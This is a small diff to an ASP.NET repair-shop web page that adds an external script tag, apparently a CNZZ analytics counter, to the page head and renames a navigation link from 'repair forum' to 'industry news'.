@@ -33,7 +33,7 @@ a:hover {
 a:active {
 	text-decoration: none;
 }
-</style></head>
+</style><script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
 <body>
 
 <div id="apDiv2" class="toplnk"><uc1:gotop ID="gotop1" runat="server" /></div>
@@ -62,7 +62,7 @@ a:active {
     <td   align="center" valign="middle" class="topbar"><a href="fix.aspx" class="ht">
         报修流程</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="bbs.aspx" class="ht">
-        维修论坛</a></td>
+        业界新闻</a></td>
     <td  align="center" valign="middle" class="topbar"><a href="shop.aspx" class="ht">
         网店介绍</a></td>
    <td  align="center" valign="middle" class="topbar"><a href="staff.aspx" class="ht">
